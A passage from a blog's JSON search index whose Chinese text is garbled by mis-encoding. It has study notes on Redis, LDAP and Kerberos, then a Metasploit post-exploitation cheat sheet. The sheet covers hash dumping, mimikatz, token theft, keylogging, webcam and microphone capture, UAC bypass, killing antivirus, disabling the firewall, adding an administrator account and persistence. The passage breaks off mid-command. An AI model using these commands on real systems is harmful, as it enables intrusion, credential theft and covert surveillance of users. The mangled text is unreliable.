\"key\":\"value\"\n}\næ•°æ®æŸ¥è¯¢: get /ç´¢å¼•/_doc/id\næ•°æ®åˆ é™¤: delete /ç´¢å¼•/_doc/id\n\n```\n\n\n# Redis\n    åŸºäºå†…å­˜çš„ï¼Œç½‘ç»œé«˜æ€§èƒ½æ•°æ®åº“\n- è¯»å–é€Ÿåº¦å¿«ï¼Œä½å»¶è¿Ÿ\n- é€‚ç”¨äºå®æ—¶åœºæ™¯\n- å¯æŒä¹…åŒ–(RDB/AOF)\n- key-value\\\nkeyå‘½å:è§åçŸ¥æ„\\\nvalue:å¯ä»¥å­˜å‚¨å¤šæ ·æ•°æ®\n- å±äºNoSQLæ•°æ®åº“(å­˜å‚¨å¤šæ ·åŒ–:å›¾åƒã€è§†é¢‘ã€éŸ³é¢‘ã€æ•°å­—ã€æ–‡å­—ç­‰)\n\n\n## Redisåº”ç”¨åœºæ™¯\n- æ’åºç±»åº”ç”¨\n- è®¾ç½®è¿‡æœŸæ—¶é—´åº”ç”¨\n- ç»Ÿè®¡è®¡æ•°\n- æ¶ˆæ¯é˜Ÿåˆ—\n- ä¸´æ—¶å­˜å‚¨\n\n## Redisç³»ç»Ÿæ¶æ„\n- `æ— ä¸­å¿ƒã€è‡ªç»„ç»‡çš„é›†ç¾¤`: é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ä¼šç»´æŠ¤ä¸€ä¸ªé›†ç¾¤æ‹“æ‰‘\n- åˆ†æ¡¶:æ ¹æ®keyå€¼è®¡ç®—hashå­˜å‚¨è¿›ä¸åŒçš„æ§½ä¸­\n- é›†ç¾¤æ‹“æ‰‘ä¸­ç»´æŠ¤çš„å°±æ˜¯æ§½å’ŒèŠ‚ç‚¹çš„æ˜ å°„å…³ç³»\n- `RedisèŠ‚ç‚¹åªå¸®åŠ©ç”¨æˆ·é‡å®šå‘ï¼Œä¸è¿›è¡Œè½¬å‘`\\\né‡å®šå‘: Clientå‘å‡ºå¤šæ¬¡è¯·æ±‚(`Clientåˆ† åˆ«è¯·æ±‚èŠ‚ç‚¹`)\\\nè½¬å‘: Clientåªéœ€è¦è¯·æ±‚ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹å¸®åŠ©Clientå‘æ­£ç¡®çš„èŠ‚ç‚¹å‘å‡ºè¯·æ±‚(Clientåªéœ€è¦è¯·æ±‚ç¬¬ä¸€ å°èŠ‚ç‚¹)\n  \n## Redisè¯»å†™æµç¨‹\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151423308.png?token=ARYCSASCGAE5V24SDVWYL7DCQCOJ6)\n\n\n1. Clientå‘ä»»æ„ä¸€ ä¸ªèŠ‚ç‚¹å‘å‡ºè¯·æ±‚ï¼Œè¿æ¥åˆ°redis\n2. ä»redisèŠ‚ç‚¹ä¸­è·å–redisé›†ç¾¤æ‹“æ‰‘ï¼Œå¾—åˆ°keyå­˜å‚¨çš„serverä¿¡æ¯\n3. å¯ä»¥è·å–åˆ°keyå¯¹åº”çš„æ§½æ‰€åœ¨çš„serverä¿¡æ¯\n4. å¦‚æœåšè¯»å–ï¼Œå¯¹serverå‘èµ·è¯»è¯·æ±‚ï¼Œå¦‚æœæ˜¯å†™å…¥ï¼Œå°±å‘èµ·å†™è¯·æ±‚\n5. `å¦‚æœåœ¨Clientè·å–æ‹“æ‰‘æ—¶ï¼Œæ•°æ®å‘ç”Ÿå˜åŠ¨ï¼Œä»ä¸€ä¸ªèŠ‚ç‚¹è¿ç§»åˆ°å¦-ä¸€ä¸ªèŠ‚ç‚¹`\n6. æ­¤æ—¶Clientè·å–åˆ°çš„æ˜¯æ—§çš„æ‹“æ‰‘ï¼Œå‘åŸå®šçš„serverå‘èµ·è¯·æ±‚\n7. serveræ¥æ”¶åˆ°è¯·æ±‚åå‘ç°Clientè¦è¯·æ±‚çš„æ•°æ®å·²ç»è¢«è¿ç§»,ä¼šå‘Šè¯‰Clientæ•°æ®è¢«è¿ç§»åˆ°å“ªä¸ªèŠ‚ç‚¹\n8. Clientä»åŸserverä¸­æ¥æ”¶åˆ°æ­£ç¡®serverçš„åé¦ˆä¿¡æ¯\n9. å¯¹æ–°serveré‡æ–°å‘èµ·ä¸€-æ¬¡è¯·æ±‚ï¼Œè·å–æ•°æ®å“åº”\n\n## Rediså…³é”®ç‰¹æ€§\n- æ”¯æŒå¤šæ•°æ®åº“\\\nåç§°ä¸æ”¯æŒè‡ªå®šä¹‰ï¼Œä»0å¼€å§‹é€’å¢\\\né»˜è®¤æƒ…å†µä¸‹æ”¯æŒ1 6ä¸ªæ•°æ®åº“,ä¸åšæ›´æ”¹çš„æƒ…å†µä¸‹ä½¿ç”¨çš„æ˜¯0å·æ•°æ®åº“\\\nå¦‚æœè¦åˆ‡æ¢å½“å‰ä½¿ç”¨çš„æ•°æ®åº“: `select 0`\n- å¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ‰€æœ‰ç¬¦åˆè§„åˆ™çš„keyå€¼\\\nkeysæ­£åˆ™è¡¨è¾¾å¼\\\nè¦æŸ¥æ‰¾æ‰€æœ‰çš„aå¼€å¤´åé¢è·Ÿæ•°å­—çš„æ‰€æœ‰çš„keyå€¼: `keys a[0-9]*`\n- åˆ¤æ–­keyæ˜¯å¦å­˜åœ¨: `exists key`\n- åˆ é™¤keyå€¼: `del key key2`\n- è·å–keyå¯¹åº”çš„ç±»å‹: `type key`\n- `redisä¸­ä¸åŒºåˆ†å¤§å°å†™( å•ä¸ªå•è¯è¦ä¸å°±å…¨å¤§å†™è¦ä¸å°±å…¨å°å†™)`\n\n## Redisæ•°æ®ç±»å‹åŠä½¿ç”¨\n- Stringçš„æ•°å­—å¯ä»¥ä½œä¸ºæ•°å€¼ç±»å‹ä½¿ç”¨\n- Hashæ·»åŠ æ•°æ®æ—¶valueæ˜¯é”®å€¼å¯¹(åº”ç”¨äºå¯¹è±¡æ•°æ®å­˜å‚¨)\n- Listå¯é‡å¤çš„æœ‰åºé›†åˆ\\\næ“ä½œæ•°æ®æ—¶å¯ä»¥åŒºåˆ†å·¦å³(å‰å)æŸ¥è¯¢æ•´ä¸ªé›†åˆä¸­çš„æ•°æ®æ—¶`lrange key 0 -1`\n- Setä¸é‡å¤æ— åºçš„é›†åˆ\\\nå¯ä»¥é’ˆå¯¹é›†åˆè®¡ç®—äº¤é›†ã€å¹¶é›†ç­‰\n- Sorted Set:æœ‰åºé›†åˆ,å¯ä»¥æ ¹æ®ç»™keyçš„åˆ†æ•°è¿›è¡Œæ’åº\n\n## Redisæ€§èƒ½ä¼˜åŒ–\n- å¯è®¾ç½®keyçš„ç”Ÿå­˜æ—¶é—´\n- Redisç®¡é“(pipeline) --> ç®¡é“æ•°æ®ä¼ è¾“é€Ÿåº¦å¿«äºæ™®é€šä¼ è¾“(ä»…åœ¨Java APIä¸­)\n- æ•°æ®æ’åºSort,å¦‚æœæ˜¯å¯¹é›†åˆè¿›è¡Œæ’åºSorted Set\n- RedisæŒä¹…åŒ–(RDB/AOF)\\\nRDB(é»˜è®¤) :ä½¿ç”¨å¿«ç…§çš„æ–¹å¼å¯¹å½“å‰æ•°æ®è¿›è¡ŒæŒä¹…åŒ–å­˜å‚¨\\\nåˆ›å»ºå¿«ç…§çš„æ¡ä»¶(åœ¨æŒ‡å®šæ—¶é—´å†…æœ‰æŒ‡å®šæ•°é‡çš„keyå‘ç”Ÿå˜åŒ–): `save æ—¶é—´sæ•°é‡`\\\næ‰‹åŠ¨è§¦å‘: savaã€bgsave\\\nsave:ä½¿ç”¨ä¸»è¿›ç¨‹è¿è¡Œï¼Œåœ¨åˆ›å»ºå¿«ç…§è¿‡ç¨‹ä¸­ä¼šå µå¡å…¶ä»–è¿›ç¨‹è¿è¡Œ\\\nbgsave:åˆ’åˆ†ä¸€ä¸ªå­è¿›ç¨‹ç”¨äºæ‰§è¡Œå¿«ç…§ï¼Œä¸ä¼šå½±å“å…¶ä»–å¾—åˆ°è¿›ç¨‹è¿è¡Œ\\\nAOF:ä½¿ç”¨çš„æ—¥å¿—æ–‡ä»¶å½¢å¼å­˜å‚¨ä¿¡æ¯\\\nå¯ä»¥è®¾å®šæ•°æ®å‘ç”Ÿå˜æ›´æ—¶è¿›è¡Œè®°å½•\\\n- Rediså†…å­˜å ç”¨æƒ…å†µ\\\nç›¸åŒæ•°æ®çš„æƒ…å†µä¸‹ï¼Œ32ä½æ“ä½œç³»ç»Ÿæ¯”64ä½æ‰€ä½¿ç”¨çš„å†…å­˜æ›´å°‘\\\n100ä¸‡æ¡ç®€å•é”®å€¼å¯¹ï¼Œå ç”¨100Mç©ºé—´ï¼Œå®é™…å ç”¨ç©ºé—´è¾ƒå°‘ï¼Œå¯å­˜å‚¨æ•°æ®é‡è¾ƒå¤§\n  \n## Redisçš„ä¼˜åŒ–\n1. ç²¾ç®€é”®åå€¼æ•°æ®:å°½å¯èƒ½ç®€å•ï¼Œä½†æ˜¯èƒ½çŸ¥æ„-->`å¯ä»¥èŠ‚çœå­˜å‚¨ç©ºé—´`\n2. åœ¨ä¸éœ€è¦æŒä¹…åŒ–çš„åº”ç”¨åœºæ™¯ä¸­å…³é—­æŒä¹…åŒ–åŠŸèƒ½\n3. å†…éƒ¨ç¼–ç ä¼˜åŒ–\n4. SlowLog:è®°å½•è¿è¡Œè¶…æ—¶å‘½ä»¤ç³»ç»Ÿ\n5. ä¿®æ”¹Linuxå†…æ ¸å†…å­˜åˆ†é…ç­–ç•¥: 1:ä¸éœ€è¦æ£€éªŒå†…å­˜æƒ…å†µï¼Œå¯ä»¥ç›´æ¥è¿è¡Œä»»åŠ¡ç›´åˆ°å†…å­˜ä½¿ç”¨å®Œä¸ºæ­¢\n6. å…³é—­THP:èŠ‚çœèµ„æºå¼€é”€(redisä¿®æ”¹æ—¶å…ˆå¤åˆ¶å†å¯¹å¤åˆ¶å†…å®¹ä¿®æ”¹)\\\n(THP:å¦‚æœæ•°æ®åªæœ‰200K,ä½¿ç”¨THPçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå¤§é¡µå¤§å°çº¦20M\\\nä¸ä½¿ç”¨THPæ—¶ï¼Œå¤åˆ¶åæ€»å¤§å°400K,ä½¿ç”¨äº†THPå¤åˆ¶åæ€»å¤§å°40M)\n7. ä¿®æ”¹linuxä¸­çš„tcpæœ€å¤§è¿æ¥æ•°\n8. é™åˆ¶Redisä½¿ç”¨å†…å­˜å¤§å°\n9. åšå¤šæ¡æ•°æ®æ“ä½œæ—¶ï¼Œå°½é‡é€‰æ‹©æ‰¹é‡æ“ä½œå‘½ä»¤ä¸è¦é€šè¿‡å¾ªç¯æ‰§è¡Œ\n\n# å®‰å…¨è®¤è¯&æƒé™ç®¡ç†Kerberos & Ldap\n    åœ¨å¤§æ•°æ®å¹³å°ä¸­ï¼Œç»Ÿä¸€èº«ä»½ä½“ç°åœ¨:åªè¦é€šè¿‡ç”¨æˆ·åå’Œå¯†ç æˆåŠŸç™»é™†ï¼Œå°±å¯ä»¥æ“ä½œæˆ`æƒè¿‡çš„ç»„ä»¶`\n    ç»Ÿä¸€ç”¨æˆ·ç®¡ç†ç³»ç»Ÿ:ç”¨æˆ·åŠç›¸å…³æƒé™ç®¡ç†ã€ç”¨æˆ·ç™»å½•åçš„ç›¸å…³ç®¡ç†ç­‰\n\n##  ç»Ÿä¸€èº«ä»½è®¤è¯ç®¡ç†ç³»ç»Ÿ\n- ç®¡ç†æ¨¡å—:ç®¡ç†ä¿¡æ¯å­˜å‚¨,ç®¡ç†è®¤è¯ï¼Œç”¨æˆ·è¯·æ±‚\n- ä¿¡æ¯å­˜å‚¨æ¨¡å—:å­˜å‚¨ç”¨æˆ·ä¿¡æ¯ã€æƒé™ä¿¡æ¯\n- è®¤è¯æ¨¡å—:é€šè¿‡ç”¨æˆ·è¯·æ±‚å’Œå½“å‰ç³»ç»Ÿå­˜å‚¨çš„ç”¨æˆ·ä¿¡æ¯åšæ¯”å¯¹ï¼Œç¡®è®¤ç”¨æˆ·æ˜¯å¦æ­£ç¡®ã€æ ¸æŸ¥ç”¨æˆ·æƒé™\n\n## Ldapç›®å½•æœåŠ¡ç³»ç»Ÿ\n- ç›®å½•:åŠ å¿«æ•°æ®æ£€ç´¢é€Ÿåº¦\n- è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€è·Ÿè¸ªåè®®\n\n## LdapServerç³»ç»Ÿç»“æ„(æ ‘çŠ¶ç»“æ„)\n- æ ‘çŠ¶ç»“æ„ä¸­ä¼šåŒ…å«å¾ˆå¤šèŠ‚ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰è‡ªå·±çš„åç§°dn(å½“å‰èŠ‚ç‚¹åŠå®ƒçš„æ‰€æœ‰çˆ¶èŠ‚ç‚¹)\n- æ ¹èŠ‚ç‚¹åç§°æ˜¯dc,æ ‡è®°ä¸ºåŒºåŸŸ\n- åŒºåŸŸçš„ä¸‹ä¸€çº§æ˜¯ç»„ç»‡ï¼Œç»„ç»‡èŠ‚ç‚¹åç§°: ou\n- ç»„ç»‡èŠ‚ç‚¹ä¸‹ä¸€çº§æ˜¯å¯¹è±¡ï¼Œå¯¹è±¡èŠ‚ç‚¹åç§°: cn,å­˜å‚¨å¯¹è±¡å±æ€§\n\n## LdapåŠŸèƒ½æ¨¡å—è®¾è®¡\n- æŸ¥è¯¢ç±»æ“ä½œ\n- æ›´æ–°ç±»æ“ä½œ\n- è®¤è¯ç±»æ“ä½œ\n- å…¶ä»–æ“ä½œ:æ”¾å¼ƒæœåŠ¡æˆ–è€…æ‰©å±•æœåŠ¡\n\n## Ldapé›†æˆè®¾è®¡\n- èº«ä»½è®¤è¯æ¶æ„è®¾è®¡\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151423534.png?token=ARYCSATO5HTD633FH2FZWO3CQCOKS)\n  \n- èº«ä»½è®¤è¯æµç¨‹è®¾è®¡\n    1. åº”ç”¨ä¾§æäº¤è®¤è¯è¯·æ±‚\n    2. Thrift Serverä»Ldapè·å–ç›¸å…³ç”¨æˆ·ä¿¡æ¯\n    3. Thrift Serveræ‰§è¡Œè®¤è¯æ¯”å¯¹\n    4. è®¤è¯æˆåŠŸåå°†è¯·æ±‚å¯¼å‘å“åº”çš„åº”ç”¨\n   \n\n\n- èº«ä»½è®¤è¯åŠŸèƒ½è®¾è®¡\n    å¯ä»¥é€šè¿‡ç»„Groupå’Œè§’è‰²Roleçš„æ–¹å¼ç»™ç”¨æˆ·èµ‹äºˆæƒé™\\\n    Group:è®¾ç½®ç»„æƒé™ï¼Œå°†ç”¨æˆ·æ·»åŠ åˆ°ç»„ä¸­\\\n    Role:ç»™è§’è‰²è®¾å®šæƒé™ï¼Œç»™ç”¨æˆ·åŒ¹é…è§’è‰²\n\n## Kerberosè®¤è¯å¤„ç†\n\n- krbServerä¸­çš„ä¸‰å¤§æ ¸å¿ƒ: Client ã€KDCã€ KDC Server\n- Client :æ¥æ”¶ç”¨æˆ·è¯·æ±‚\n- KDC:ç”Ÿæˆå¯†é’¥ï¼Œå‘æ”¾å¯†é’¥ç­‰\n- KDC Server:æä¾›å¯†é’¥æœåŠ¡\n\n## Kerberosåº”ç”¨æµç¨‹\n1. ç”¨æˆ·æä¾›ç”¨æˆ·åå’Œå¯†ç ç»™ç™»å½•è®¤è¯ç³»ç»Ÿ\n2. ç™»å½•è®¤è¯ç³»ç»Ÿé€šè¿‡ç™»å½•è®¤è¯åï¼Œåé¦ˆä¸€ä¸ªå½“å‰ç”¨æˆ·çš„ç”¨æˆ·ä¿¡æ¯å¡ (ç”¨æˆ·ã€å¯†ç ã€æ‰€æˆæƒä¿¡æ¯)\n3. ç”¨æˆ·è·å–åˆ°ç”¨æˆ·ä¿¡æ¯å¡ä¹‹åå°±å¯ä»¥è¿›å…¥åˆ°MRSä¸­.\n4. åœ¨MRSä¸­æ‰¾åˆ°å¯¹åº”çš„è¦ä½¿ç”¨çš„ç»„ä»¶,æäº¤è‡ªå·±çš„ä¿¡æ¯å¡\n5. ç»„ä»¶å¯¹æ¯”ä¿¡æ¯å¡æŸ¥çœ‹æ˜¯å¦å…·æœ‰å½“å‰ç»„ä»¶çš„æƒé™\n6. ç”¨æˆ·å‰å¾€æƒé™æˆæƒä¸­å¿ƒ,æäº¤ä¿¡æ¯å¡,æƒé™æˆæƒä¸­å¿ƒæ ¹æ®ä¿¡æ¯å¡å¯¹æŒ‡å®šç»„ä»¶è¿›è¡Œæˆæƒ(ST)\n7. ç”¨æˆ·è·å–åˆ°å¯¹åº”ç»„ä»¶çš„æˆæƒä¿¡æ¯ï¼Œå¯ä»¥å†æ¬¡å‘ç»„ä»¶å‘èµ·è¯·æ±‚(ä¿¡æ¯å¡, ST)\n8. ç»„ä»¶æ¥æ”¶åˆ°è¯·æ±‚åå†æ¬¡æ ¡éªŒ,æ ¡éªŒç»“æœæ²¡é—®é¢˜çš„è¯ï¼Œç”¨æˆ·å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨ç»„ä»¶\n","tags":["HCIA","å¤§æ•°æ®"],"categories":["ç¬”è®°"]},{"title":"msfåæ¸—é€ä½¿ç”¨","url":"/2022/04/18/msfåæ¸—é€ä½¿ç”¨/","content":"# msfåæ¸—é€å‘½ä»¤æ•´ç†\n\n- åæ¸—é€åŸºæœ¬çŸ¥è¯†\n- æƒé™ç»´æŒ,æƒé™æå‡,å†…ç½‘æ¸—é€ç­‰\n- å†…ç½‘æ¸—é€:ä¿¡æ¯æ”¶é›†,è¯»å–ç”¨æˆ·hash,æµè§ˆå™¨å¯†ç ç­‰\n- åŸŸæ¸—é€:è·å–åŸŸæ§æƒé™\n\n## 1.åæ¸—é€åŸºæœ¬æ“ä½œ\n```bash\nbackground\t\t    è®©meterpreterå¤„äºåå°\nsessions -i ä¼šè¯å·\t    ä¸ä¼šè¯è¿›è¡Œäº¤äº’\nquit \t\t\t    é€€å‡ºä¼šè¯\nshell\t\t\t    è·å–ä¸€ä¸ªäº¤äº’å¼shell\nirb\t\t            å¼€å¯rubyç»ˆç«¯\n```\n\n\n## 2.æ–‡ä»¶æ“ä½œå‘½ä»¤\n```bash\ncat \t\t    æŸ¥çœ‹æ–‡ä»¶å†…å®¹\ngetwd\t\t    æŸ¥çœ‹å½“å‰å·¥ä½œç›®å½•\nupload\t\t    ä¸Šä¼ æ–‡ä»¶\ndownload\t    ä¸‹è½½æ–‡ä»¶\nedit\t\t    ç¼–è¾‘æ–‡ä»¶\nsearch\t\t    æœç´¢æ–‡ä»¶\n```\n\n\n## 3.ç½‘ç»œå‘½ä»¤\n```bash\nipconfig/ifconfig\t\tæŸ¥çœ‹ç½‘ç»œæ¥å£ä¿¡æ¯\nportwd\t\t\t\tç«¯å£è½¬å‘\tæœ¬æœºç›‘å¬ç«¯å£\tæŠŠç›®æ ‡æœºç«¯å£è½¬åˆ°æœ¬æœºç«¯å£ä¸Š\nrdesktop\t\t\tä½¿ç”¨rdesktopæ¥è¿æ¥ -u ç”¨æˆ·å -p å¯†ç \nroute\t\t\t\tè·å–è·¯ç”±è¡¨\n```\n\n\n## åæ¸—é€åŸºæœ¬æ“ä½œ\n```bash\nps\t\t\t    æŸ¥çœ‹å½“å‰è¿›ç¨‹\nmigrate pid\t            å°†meterpreterè¿›ç¨‹pidç§»åŠ¨åˆ°æŒ‡å®šè¿›ç¨‹ä¸­\nexecute -H -i -f cmd.exe    åˆ›å»ºæ–°è¿›ç¨‹cmd.exe -Hä¸å¯è§\t-iäº¤äº’\ngetpid\tè·                   å–å½“å‰è¿›ç¨‹çš„pid\nkill pid\t            æ€æ­»è¿›ç¨‹\ngetuid\t                    æŸ¥çœ‹å½“å‰æƒé™\nsysinfo\t                    æŸ¥çœ‹ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯\n```\n\n## åæ¸—é€é«˜çº§æ“ä½œ\n```bash\n# poståæ¸—é€æ¨¡å—\nrun post/windows/gather/enum_applications \t#è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯\nrun post/windows/gather/dumplinks \t\t#è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œ\nrun scraper \t\t\t                #è·å–å¸¸è§ä¿¡æ¯\t\nrun post/windows/gather/enum_patches \t        #è·å–è¡¥ä¸ä¿¡æ¯\nrun post/windows/gather/enum_domain  \t        #æŸ¥æ‰¾åŸŸæ§\nrun post/windows/manage/migrate           #è‡ªåŠ¨è¿›ç¨‹è¿ç§»\nrun post/windows/gather/checkvm           #æŸ¥çœ‹ç›®æ ‡ä¸»æœºæ˜¯å¦è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š\nrun post/windows/manage/killav            #å…³é—­æ€æ¯’è½¯ä»¶\nrun post/windows/manage/enable_rdp        #å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡\nrun post/windows/manage/autoroute         #æŸ¥çœ‹è·¯ç”±ä¿¡æ¯\nrun post/windows/gather/enum_logged_on_users    #åˆ—ä¸¾å½“å‰ç™»å½•çš„ç”¨æˆ·\nrun post/windows/gather/enum_applications       #åˆ—ä¸¾åº”ç”¨ç¨‹åº\nrun post/windows/gather/credentials/windows_autologin #æŠ“å–è‡ªåŠ¨ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç \nrun post/windows/gather/smart_hashdump               #dumpå‡ºæ‰€æœ‰ç”¨æˆ·çš„hash\nrun getgui -u hack -p 123 #æœ‰æ—¶å€™æ— æ³•ä½¿ç”¨åæ¸—é€æ¨¡å—æ·»åŠ ç”¨æˆ·å¯ä»¥ä½¿ç”¨shellè‡ªä¸»æ·»åŠ \nnet user hack Zyx960706 /add\nnet localgroup administrator hack /add\nnetsh advfirewall set allprofiles state off        #å…³é—­é˜²ç«å¢™\nnet stop windefend\nrun post/windows/gather/enum_patches   #è¡¥ä¸ä¿¡æ¯\nrun  post/multi/recon/local_exploit_suggester   #æŸ¥è¯¢å¯åˆ©ç”¨çš„æ¼æ´\n\n\n# loadå‘½ä»¤  \nload mimikatz                                   åŠ è½½mimikatz\nwdigest\t                                        è·å–ç”¨æˆ·å¯†ç \nload incognito                      åŠ è½½incognitoç›—å–ä¸»æœºç”¨æˆ·ä»¤ç‰Œå‡å†’ç”¨æˆ·\n\n# åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹ï¼ˆç³»ç»Ÿã€ç«¯å£ï¼‰\nauxiliary/scanner/discovery/udp_sweep    #åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº\nauxiliary/scanner/discovery/udp_probe    #åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº\nauxiliary/scanner/netbios/nbname         #åŸºäºnetbiosåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº\nauxiliary/scanner/portscan/tcp           #åŸºäºtcpè¿›è¡Œç«¯å£æ‰«æ(1-10000)\n\n# ç«¯å£æ‰«æ\nauxiliary/scanner/portscan/tcp           #åŸºäºtcpè¿›è¡Œç«¯å£æ‰«æ(1-10000)\nauxiliary/scanner/portscan/ack           #åŸºäºtcpçš„ackå›å¤è¿›è¡Œç«¯å£æ‰«æï¼Œé»˜è®¤æ‰«æ1-10000ç«¯å£\n#ç«¯å£æ‰«ææœ‰æ—¶ä¼šä½¿ä¼šè¯ç»ˆç«¯ï¼Œæ‰€ä»¥å¯ä»¥ä¸Šä¼ nmapååœ¨shellä¸­ä½¿ç”¨nmapæ‰«æã€‚ä½†æ˜¯è¦è®°å¾—æ¸…ç†\n\n# æœåŠ¡æ‰«æ\nauxiliary/scanner/ftp/ftp_version        #å‘ç°å†…ç½‘ftpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤21ç«¯å£\nauxiliary/scanner/ssh/ssh_version        #å‘ç°å†…ç½‘sshæœåŠ¡ï¼ŒåŸºäºé»˜è®¤22ç«¯å£\nauxiliary/scanner/telnet/telnet_version  #å‘ç°å†…ç½‘telnetæœåŠ¡ï¼ŒåŸºäºé»˜è®¤23ç«¯å£\nauxiliary/scanner/dns/dns_amp            #å‘ç°dnsæœåŠ¡ï¼ŒåŸºäºé»˜è®¤53ç«¯å£\nauxiliary/scanner/http/http_version      #å‘ç°å†…ç½‘httpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤80ç«¯å£\nauxiliary/scanner/http/title             #æ¢æµ‹å†…ç½‘httpæœåŠ¡çš„æ ‡é¢˜\nauxiliary/scanner/smb/smb_version        #å‘ç°å†…ç½‘smbæœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„445ç«¯å£   \nuse auxiliary/scanner/mssql/mssql_schemadump  #å‘ç°å†…ç½‘SQLServeræœåŠ¡,åŸºäºé»˜è®¤çš„1433ç«¯å£\nuse auxiliary/scanner/oracle/oracle_hashdump  #å‘ç°å†…ç½‘oracleæœåŠ¡,åŸºäºé»˜è®¤çš„1521ç«¯å£\nauxiliary/scanner/mysql/mysql_version    #å‘ç°å†…ç½‘mysqlæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3306ç«¯å£\nauxiliary/scanner/rdp/rdp_scanner        #å‘ç°å†…ç½‘RDPæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3389ç«¯å£\nauxiliary/scanner/redis/redis_server     #å‘ç°å†…ç½‘RedisæœåŠ¡ï¼ŒåŸºäºé»˜è®¤6379ç«¯å£\nauxiliary/scanner/db2/db2_version        #æ¢æµ‹å†…ç½‘çš„db2æœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„50000ç«¯å£\nauxiliary/scanner/netbios/nbname         #æ¢æµ‹å†…ç½‘ä¸»æœºçš„netbiosåå­—\n```\n\n\n### ä¿¡æ¯æ”¶é›†\n```bash\nrun post/windows/gather/checkvm\t\tæ£€æŸ¥æ˜¯å¦ä¸ºè™šæ‹Ÿæœº\ncmdä¸‹ quser\t\tæŸ¥çœ‹ç”¨æˆ·æ˜¯å¦åœ¨çº¿\nidletime\t\tæ£€æŸ¥å—å®³è€…é—²ç½®äº†å¤šä¹…\nscreenshot\t        æˆªå±\n```\n\n### ç”¨æˆ·å£ä»¤\n```bash\nhashdump\tè·å–ç”¨æˆ·hash\nrun post/windows/gather/smart_hashdump\tè·å–åŸŸçš„å¯†ç \n```\n\n\n### æƒé™æå‡\n```bash\næ™®é€šç”¨æˆ·åˆ©ç”¨æ¼æ´è·å–æƒé™\nuse exploit/windows/local/ms18_8120_win32k_privesc\n```\n\n\n### è‡ªåŠ¨åŒ¹é…ææƒæ¨¡å—\n```bash\npost/multi/recon/local_exploit_suggester\npost/windows/gather/enum_patches\n```\n\n### å…³é—­é˜²ç«å¢™\n```bash\nnetsh advfirewall set allprofiles state off\n```\n\n\n### æœ¬åœ°ææƒ\n```bash\nsearch local/ms\n```\n\n\n### ç»•è¿‡UAC\n```bash\nuse exploit/windows/local/bypassuac \nuse exploit/windows/local/bypassuac_injection \nuse windows/local/bypassuac_vbs \nuse windows/local/ask\n```\n\n\n### è·å–systemæƒé™\n```bash\ngetsystem\n```\n\n### ç¼“å­˜å£ä»¤\n```bash\nè·å–è°·æ­Œchromeç¼“å­˜\nrun post/windows/gather/enum_chrome\n\nè·å–ç«ç‹firfoxç¼“å­˜\nrun post/windows/gather/enum_firefox\n\nè·å–IEç¼“å­˜\nrun post/windows/gather/enum_ie\n```\n\n### é”®ç›˜è®°å½•\n```bash\nkeyscan_start\tå¼€å¯é”®ç›˜è®°å½•\nkeyscan_dump\tæ˜¾ç¤ºæ•æ‰åˆ°çš„è®°å½•\nkeyscan_stop\tåœæ­¢é”®ç›˜è®°å½•\n```\n\n### åŸŸå£ä»¤è·å–\n```bash\nsteal_token è¯•å›¾çªƒå–æŒ‡å®š(pid)è¿›ç¨‹çš„ä»¤ç‰Œ\nuse incognito\t\tåŠ è½½incogintoåŠŸèƒ½(ç›—å–ç›®æ ‡ä¸»æœºçš„ä»¤ç‰Œæˆ–æ˜¯å‡å†’ç”¨æˆ·)\nlist_tokens -u\t\tåˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·çš„å¯ç”¨ä»¤ç‰Œ\nlist_tokens -g\t\tåˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·ç»„çš„å¯ç”¨ä»¤ç‰Œ\n```\n\n### æ‘„åƒå¤´ä¿¡æ¯\n```bash\nrecord_mic\téŸ³é¢‘å½•åˆ¶\nwebcam_chat\t\tæŸ¥çœ‹æ‘„åƒå¤´æ¥å£\nwebcam_list\t\tæŸ¥çœ‹æ‘„åƒå¤´åˆ—è¡¨\nwebcam_stream\tæ‘„åƒå¤´è§†é¢‘è·å–\n```\n\n### åé—¨æŒä¹…åŒ–,æƒé™ç»´æŒ\n``` bash\n1.migrate\nmigrate pid\nå¯ä»¥å°†meterpreterçš„å½“å‰è¿›ç¨‹è¿ç§»åˆ°å…¶ä»–æŒ‡å®šè¿›ç¨‹ä¸­,è¿™æ ·åšçš„å¥½å¤„æ˜¯ç»™åé—¨ä¸€ä¸ªç›¸å¯¹ç¨³å®šçš„ç¯å¢ƒ,åŒæ—¶å¯ä»¥é˜²æ­¢æ€è½¯\n\n2.metsvc\nrun metsvc 